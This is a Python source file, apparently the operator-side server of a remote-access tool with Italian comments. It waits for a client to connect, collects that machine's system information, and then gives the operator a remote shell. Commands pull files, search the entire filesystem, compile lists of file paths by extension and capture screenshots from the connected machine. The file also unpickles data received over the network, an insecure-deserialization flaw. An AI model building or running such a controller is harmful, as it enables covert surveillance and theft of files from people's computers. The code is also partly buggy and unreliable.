import os
import pickle
from socket import *
import platform
import time
import signal
from os import system
import traceback
import sys
from traceback import print_exc


IP = "localhost"
PORT = 8082  # Porta di 2Ascolto del TCP
ADDR = (IP, PORT)
SIZE = 4096
FORMAT = "utf-8"
fileLog = "###FILELOG RESULT###\n"

# OK funzione di pulizia schermo per unix e windows
def clearScreen():
    if platform.system() == "Windows":
        system("cls")
    else:
        system("clear")


# OK gestisce il ctrl-C per l'uscita
def signalHandler(signum, frame):
    msg = "Uscita effettuata con successo"
    print(":", msg, end="", flush=True)
    exit(1)


# OK crea connessione
def serverConnection():
    try:
        server = socket(AF_INET, SOCK_STREAM)
        server.bind(ADDR)
        server.listen(5)
        print(f"\n[LISTENING] Server acceso!\n")
        return server
    except:
        print(f"[ERROR] Accensione server non riuscita...\n")
        return "errore"


# OK lista dei comandi disponibili per il controllo remoto
def commandsHelp():
    print("#####    Comandi disponibili     ####")
    print()
    print("Download di file:    download <nomeFile.estensione> (txt docx pdf video foto excel cartelle zip ")
    print("Mostra Working Directory:    pwd")
    print("Lista dei file in un percorso:   ls")
    print("Cambia posizione:    cd <path>")
    print("Cerca un file in tutto il FileSystem:   find <nomeFile.estensione>")
    print("Cerca un file nel path desiderato:   find <nomeFile.estensione> <Path>")
    print("Effettua screenshot:     screenshot")
    print(
        "Crea un file .txt con i percorsi di tutti i file con una certa estensione:   filespath <nomeFiletxt> <estensione>")
    print("aggiungere di poter usare anche gli altri comandi")
    print("file log")
    print("Esci dal controllo remoto:   exit")
    print()
    print("####################################")


# OK STAMPA INFO CLIENT
def printInformazioni(clientConnection):
    # Ricezione del file dal Client
    buff = 1
    risposta = "1"
    nbytes = 1

    try:
        while buff and nbytes != '':
            nbytes = clientConnection.recv(256).decode(FORMAT)
            newNBytes = ""
            buff = ""

            if nbytes[0:1].isdigit():
                while nbytes[0:1].isdigit():
                    newNBytes = newNBytes + nbytes[0:1]
                    nbytes = nbytes[1:]
                buff = clientConnection.recv((int(newNBytes))).decode(FORMAT)
            else:
                time.sleep(3)
                buff = clientConnection.recv((int(nbytes))).decode(FORMAT)

            nbytes = ''
            if buff[0:7] == "[ERROR]":
                risposta = "null"
                while risposta != '0' and risposta != '1':
                    risposta = input(buff)
                    clientConnection.send((risposta).encode(FORMAT))
                    if risposta == '1':
                        buff = 1
                        nbytes = 1
                    elif risposta == '0':
                        buff = 0
                        break

            print(buff)
            global fileLog
            fileLog=fileLog+"\n"+buff+"\n"

        if risposta == '1':
            print(f"[RECEIVING] Informazioni ricevute\n")
        elif risposta == '0':
            print(f"[NOT RECEIVING] Informazioni non ricevute\n")
    except:
        raise Exception


# FILESPATH
def filespath(clientConnection):
    try:
        nomeFile = "FilesPath.txt"
        file = open(nomeFile, 'ab')
        newNBytes = ""
        filesize = clientConnection.recv(256).decode(FORMAT)
        if filesize == "Download fallito":
            print(filesize)
            raise Exception
        elif filesize[0:1].isdigit():
            while filesize[0:1].isdigit():
                newNBytes = newNBytes + filesize[0:1]
                filesize = filesize[1:]
            file.write(clientConnection.recv(int(newNBytes)+8000))
            time.sleep(3)
        elif filesize[0:7] == "[ERROR]":
            print(filesize)
        else:
            file.write(clientConnection.recv(int(filesize)))
            time.sleep(3)

            # barra di caricamento
        file.close()
        print("File con percorsi dei file creato!")
    except:
        traceback.print_exc()
        print("Filespath ha dato problemi\n")


# CONTROLLO REMOTO
def remoteControl(clientConnection):
    while True:
        try:
            pathError = clientConnection.recv(1024).decode(FORMAT)
            if pathError[0:7]=="[ERROR]":
                path=clientConnection.recv(1024).decode(FORMAT)
                print(path+"$ "+pathError)
            else:
                path=pathError

            comando = input(path + "$ ")
            while comando == "":
                comando = input(path + "$ ")

            global fileLog
            fileLog=fileLog+"\n"+path + "$ "+comando+"\n"

            clientConnection.send((comando).encode(FORMAT))
            if comando == "exit":
                print(f"[REMOTE CONTROL CLOSED] Procedura di controllo remoto conclusa con successo!\n")
                clientConnection.send((comando).encode(FORMAT))
                break
            elif comando[0:2] == "ls":
                listdir = pickle.loads(clientConnection.recv(1024))
                for item in listdir:
                    print("-: " + item)
                    fileLog = fileLog + "\n" + "-: " + item + "\n"
            elif comando[0:8] == "download":
                try:
                    # Write File in binary
                    file = open(comando[10:len(comando) - 1], 'wb')
                    # Keep receiving data from the server
                    filesize = clientConnection.recv(1024).decode(FORMAT)
                    if filesize == "Download fallito":
                        print(filesize)
                    else:
                        time.sleep(3)
                        file.write(clientConnection.recv(int(filesize)))

                    time.sleep(2)
                    file.close()
                except:
                    traceback.print_exc()
                    print("Download fallito\n")
            elif comando == "pwd":
                pwdresult = clientConnection.recv(1024).decode(FORMAT)
                print(pwdresult)
                fileLog = fileLog + "\n" + pwdresult + "\n"

            # "Crea un file .txt con i percorsi di tutti i file con una certa estensione:   filespath <estensione>"
            elif comando[0:9] == "filespath":
                filespath(clientConnection)
                time.sleep(3)
            elif comando[0:4] == "find":
                msg=clientConnection.recv(1024).decode(FORMAT)
                if msg == "Dati in arrivo...":
                    print("Dati in arrivo...\n")
                    listresult = pickle.loads(clientConnection.recv(1024))
                    for item in listresult:
                        print("-: " + item)
                        fileLog = fileLog + "\n" + "-: " + item + "\n"

                elif msg == "Connessione interrotta":
                    print("Connessione interrotta\n")
                    fileLog = fileLog + "\n" + "Connessione interrotta\n" + "\n"

                    break
                elif msg == "Si è verificato un errore, verifica il comando":
                    print("Si è verificato un errore, verifica il comando...\n")
                    fileLog = fileLog + "\n" + "Si è verificato un errore, verifica il comando...\n" + "\n"

            elif comando == "clear":
                clearScreen()
            elif comando == "help":
                commandsHelp()
            elif comando[0:5] == "cd .." or comando[0:2] == "cd":
                pass
            elif comando[0:4] == "info":
                output = clientConnection.recv(1024).decode(FORMAT)
                print(output)
                fileLog = fileLog + "\n" + output + "\n"
            elif comando[0:10] == "screenshot":
                myScreenshot=clientConnection.recv(1310720000)
                nomeFoto=input("Inserisci il nome della foto: ")
                file = open(nomeFoto, "wb")
                file.write(myScreenshot)
                file.close()
            else:
                msg = clientConnection.recv(1024).decode(FORMAT)
                if msg == "Dati in arrivo...":
                    print("Dati in arrivo...\n")
                    filesize=clientConnection.recv(256).decode(FORMAT)
                    output = clientConnection.recv(filesize).decode(FORMAT)
                    print(output)
                    fileLog = fileLog + "\n" + output + "\n"

                elif msg == "Connessione interrotta":
                    print("Connessione interrotta\n")
                    fileLog = fileLog + "\n" + "Connessione interrotta\n" + "\n"

                    break
                elif msg == "Si è verificato un errore, verifica il comando":
                    print("Si è verificato un errore, verifica il comando...\n")
                    fileLog = fileLog + "\n" + "Si è verificato un errore, verifica il comando...\n" + "\n"

        except Exception as e:
            if e.__class__.__name__ == "ConnectionResetError":
                print(f"[CONNECTION INTERRUPTED] Connessione interrotta\n")
                fileLog = fileLog + "\n" + "[CONNECTION INTERRUPTED] Connessione interrotta\n" + "\n"
                raise e
            raise e


def main():
    signal.signal(signal.SIGINT, signalHandler)
    server = serverConnection()
    if server == "errore":
        raise Exception
    else:
        exit = False
        while exit == False:

            clientConnection, addr = server.accept()
            print(f"\n[CONNECTED] Client {addr} is connected to the server")
            os.mkdir(f"cartellaClient {addr}")
            os.chdir(os.getcwd()+"/"+f"cartellaClient {addr}")
            global fileLog
            fileLog = fileLog + "\n" + "\n[CONNECTED] Client {addr} is connected to the server" + "\n"

            print(f"INFORMAZIONI SISTEMA OPERATIVO CLIENT:\n")
            fileLog = fileLog + "\n" + "INFORMAZIONI SISTEMA OPERATIVO CLIENT:\n" + "\n"

            t_end = time.time() + 3
            while time.time() < t_end:
                print(".", end="")
                time.sleep(1)
                print(".", end="")
                time.sleep(1)
                print(".")
                time.sleep(1)

            #RICEVO INFORMAZIONI SISTEMA OPERATIVO
            try:
                printInformazioni(clientConnection)
                time.sleep(2)
            except Exception as e:
                if e.__class__.__name__ == "ConnectionResetError":
                    exit = True
                else:
                    print(f"[ERROR] Qualcosa nella print informazioni non ha funzionato... attendi\n")
                    fileLog = fileLog + "\n" + "[ERROR] Qualcosa nella print informazioni non ha funzionato... attendi\n" + "\n"

                    t_end = time.time() + 5
                    while time.time() < t_end:
                        print(".", end="")
                        time.sleep(1)
                        print(".", end="")
                        time.sleep(1)
                        print(".")
                        time.sleep(1)

            #ATTIVO LA REMOTE CONTROL
            attivo = 1
            while attivo == 1:
                try:
                    print(f"[REMOTE CONTROL] Starting procedure...")
                    t_end = time.time() + 5
                    while time.time() < t_end:
                        print(".", end="")
                        time.sleep(1)
                        print(".", end="")
                        time.sleep(1)
                        print(".")
                        time.sleep(1)
                    remoteControl(clientConnection)
                    attivo = 0

                except Exception as e:
                    traceback.print_exc()
                    if e.__class__.__name__ == "ConnectionResetError":
                        print(f"La connessione con il client si è interrotta\n")
                        fileLog = fileLog + "\n" + "La connessione con il client si è interrotta\n" + "\n"
                        attivo = 0
                        raise e
                    else:
                        risposta="null"
                        while risposta !='0' and risposta !='1':
                            risposta = input(f"Remote control non disponibile, riprovare? Y-1/N-0 ")
                            if risposta == '1':
                                attivo = 1
                            elif risposta == '0':
                                attivo = 0

            clientConnection.close()
            print(f"[CLOSED] Client Connection closed succesfully!")
            print()

            # Le operazioni sono concluse e decido come procedere
            print(f"[DECISION] Do you want to close the Sever or keep listening for new Clients?")
            print(f"[DECISION] 1 - Keep Listening")
            print(f"[DECISION] 2 - Close Server")
            restartDecision = input("> ")

            if restartDecision == '2':
                exit = True
                print(f"[INFO] The Server was shut down successfully")
                server.close()
                sys.exit(0)
            elif restartDecision == '1':
                file = open("fileLog.txt", "w")
                file.write(fileLog)
                file.close()
                fileLog=""
                print(f"[INFO] The server keeps listening...")
                t_end = time.time() + 5
                while time.time() < t_end:
                    print(".", end="")
                    time.sleep(1)
                    print(".", end="")
                    time.sleep(1)
                    print(".")
                    time.sleep(1)
            else:
                file = open("fileLog.txt", "w")
                file.write(fileLog)
                file.close()
                fileLog = ""
                clientConnection.close()
                server.close()


if __name__ == "__main__":
    # , gestione comandi nativi rc,
    # file log, screenshot, agg commnaHelps, cd del path completo
    ##download cartelle, loop clientcclose, barra di caricamento
    # controllare dove fare differenze di sistema

    try:
        main()
    except:
        file = open("fileLog.txt", "w")
        file.write(fileLog)
        file.close()
        fileLog = ""
        print(f"[CLOSE] Server chiuso.")
        t_end = time.time() + 10
        while time.time() < t_end:
            print(".", end="")
            time.sleep(1)
            print(".", end="")
            time.sleep(1)
            print(".")
            time.sleep(1)

